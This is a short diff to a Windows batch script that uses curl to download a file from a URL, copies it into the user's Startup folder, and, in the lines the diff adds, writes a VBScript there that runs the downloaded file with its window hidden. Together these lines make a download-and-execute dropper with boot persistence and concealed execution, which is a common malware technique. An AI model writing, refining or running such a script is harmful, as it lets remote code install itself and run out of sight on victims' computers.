@@ -7,8 +7,7 @@ set startupFolder="%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
 curl -o %outputFile% %url%
 copy %outputFile% %startupFolder%
+echo Set objShell = WScript.CreateObject("WScript.Shell") > %startupFolder%\%vbsScript%
+echo objShell.Run "%startupFolder%\%outputFile%", 0, True >> %startupFolder%\%vbsScript%
 
-echo Set objShell = WScript.CreateObject("WScript.Shell") > %vbsScript%
-echo objShell.Run "%startupFolder%\%outputFile%", 0, True >> %vbsScript%
-
-cscript /nologo %vbsScript%
+cscript /nologo %startupFolder%\%vbsScript%
